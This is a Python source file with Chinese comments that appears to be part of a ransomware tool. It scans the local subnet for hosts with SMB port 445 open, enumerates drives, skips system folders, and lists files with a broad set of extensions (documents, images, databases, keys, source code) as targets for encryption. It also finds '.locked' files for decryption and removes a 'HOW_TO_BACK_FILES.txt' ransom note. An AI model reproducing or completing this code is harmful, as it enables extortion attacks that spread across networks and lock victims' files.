#! encoding:utf-8

import random,socket,sys,time,os
import threading

lock = threading.Lock()
HOSTS = []
threads = []

# 跳过系统目录（不加密）
skip_dic=[
    "/usr/",
    "/etc/",
    ":\\Windows\\",
    ":\\Intel\\",
    ":\\nvidia\\",
    ":\\$RECYCLE.BIN\\",
    ":\\Program Files (x86)\\",
    ":\\Program Files\\",
    ":\\System Volume Information\\",
    "\\ProgramData",
    "\\All Users\\",
    "\\AppData\\Local\\Temp",
    "\\Local Settings\\Temp"
    "\\Application Data\\",
]

def get_drives():
    # 获取磁盘
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    letter = ord('A')
    while bitmask > 0:
        if bitmask & 1:
            drives.append(chr(letter) + ':\\')
        bitmask >>= 1
        letter += 1
    return drives

def check_os():
    # 检测操作系统
    try:
        if sys.platform.lower().startswith('linux'):
            return'linux'
        elif sys.platform.lower().startswith('darwin'):
            return 'macos'
        elif sys.platform.lower().startswith('win32') or sys.platform.lower().startswith('cygwin'):
            return 'windows'
    except:
        pass

def scan_port(host,port):
    # 扫描端口
    global HOSTS
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        lock.acquire()
        HOSTS.append(host)
        lock.release()
        s.close()
    except:
        pass


def get_hosts_ip():
    # 获取主机内网ip
    """
    这个方法是目前见过最优雅获取本机服务器的IP方法了。没有任何的依赖，也没有去猜测机器上的网络设备信息。
    而且是利用 UDP 协议来实现的，生成一个UDP包，把自己的 IP 放如到 UDP 协议头中，然后从UDP包中获取本机的IP。
    这个方法并不会真实的向外部发包，所以用抓包工具是看不到的。但是会申请一个 UDP 的端口，所以如果经常调用也会比较耗时的，这里如果需要可以将查询到的IP给缓存起来，性能可以获得很大提升。
    """
    _local_ip=None
    s = None
    try:
        if not _local_ip:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            _local_ip = s.getsockname()[0]
        if _local_ip:
            ips = [_local_ip[:_local_ip.rfind(".")+1]+str(i) for i in range(1,255) if i != _local_ip]
            # ips = [_local_ip[:_local_ip.rfind(".")+1]+str(i) for i in range(1,255)]
            for ip in ips:
                t = threading.Thread(target=scan_port,args=(ip,445))
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
            return HOSTS
        else:
            _local_ip
    finally:
        if s:
            s.close()

def discoverFiles_encry(startpath):
    # 遍历加密文件

    # 加密的文件后缀
    ENCRYPTABLE_FILETYPES = [
        # ".txt"
        # GENERAL FORMATS
        ".dat", ".keychain", ".sdf", ".vcf",".NDF",".ndf",
        # IMAGE FORMATS
        ".jpg", ".png", ".tiff", ".tif", ".gif", ".jpeg", ".jif", ".jfif", ".jp2", ".jpx", ".j2k", ".j2c", ".fpx", ".pcd", ".bmp",
        ".svg",
        ".3dm", ".3ds", ".max", ".obj", ".dds", ".psd", ".tga", ".thm", ".tif", ".tiff", ".yuv", ".ai", ".eps", ".ps", ".svg", ".indd",
        ".pct",".pem",".ldf",".LDF",".key",".KEY",".exe",".dll",".DLL",
        # VIDEO FORMATS
        ".mp4", ".avi", ".mkv", ".3g2", ".3gp", ".asf", ".flv", ".m4v", ".mov", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv",
        ".vep",".pbb",".zhc",".zhl",
        # DOCUMENT FORMATS
        ".doc",".DOC", ".docx",".DOCX", ".txt",".TXT", ".pdf",".PDF", ".log",".LOG", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd", ".wps", ".csv", ".ged", ".key",
        ".pps",
        ".ppt", ".pptx", ".xml", ".json", ".xlsx",".XLSX", ".xlsm", ".xlsb",".XLSB" ,".xls",".XLS", ".mht", ".mhtml" ,".htm", ".html",".Html", ".xltx", ".prn",
        ".dif",
        ".slk", ".xlam", ".xla", ".ods", ".docm", ".dotx", ".dotm", ".xps", ".ics",".md",".part",".chm",".text",".TEXT",".config",".CONFIG",
        # SOUND FORMATS
        ".mp3", ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mpa", ".wav", ".wma",".jks",".xsd",".properties",".policy",".dwg",".dwg",
        ".dwt",".DWT",".dws",".DWS",".dxf",".fla",".FLA",".hpp",".HPP",".LRG",
        # EXE AND PROGRAM FORMATS
        ".msi", ".php", ".apk", ".app", ".bat",".BAT", ".cgi", ".com", ".asp", ".aspx", ".cer", ".cfm", ".css", ".htm", ".Htm",
        ".js", ".jsp", ".rss", ".xhtml", ".c", ".class", ".cpp", ".cs", ".h", ".pyc" , ".py" , ".java", ".lua", ".pl", ".sh", ".sln",
        ".swift" , ".vb",".VB",".vcxproj",".BAK",".mf",".MF",".jar",".com",".net",".NET",".cmd",".CMD",".bashrc",".cnf",".skp",".myd",".frm",".MYI",
        # GAME FILES
        ".dem", ".gam", ".nes", ".rom", ".sav",".x3d",".spi",".ack",".pak",".lnk",".md5",".ins",".war",".reg",".cab",
        # COMPRESSION FORMATS
        ".tgz", ".zip", ".rar", ".tar", ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rpm", ".zipx", ".iso",".z",".vsdx",".TMP",".Lst",
        # MISC
        ".ged", ".accdb", ".db", ".dbf", ".mdb", ".sql", ".fnt", ".fon", ".otf", ".ttf", ".cfg", ".ini", ".prf", ".bak", ".old", ".tmp",
        ".torrent" , ".rbk" ,".rep" , ".dbb",".mdf",".MDF",".wdb"
        ]

    for dirpath, dirs, files in os.walk(startpath, topdown=True):
        for dic in skip_dic:
            if dic in dirpath:
                dic = None
                break
        else:
            if dic == None:
                continue
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            file, ext = os.path.splitext(i)

            if ext in ENCRYPTABLE_FILETYPES:
                yield absolute_path

def discoverFiles_decry(startpath):
    # 遍历解密文件
    ext = ".locked"
           
    files_to_dec = []
    for root, dirs, files in os.walk(startpath):
        for file in files:
            root_file = os.path.join(root, file)
            if "HOW_TO_BACK_FILES.txt" == file:
                os.remove(root_file)
            if file.endswith(str(ext)):
                yield root_file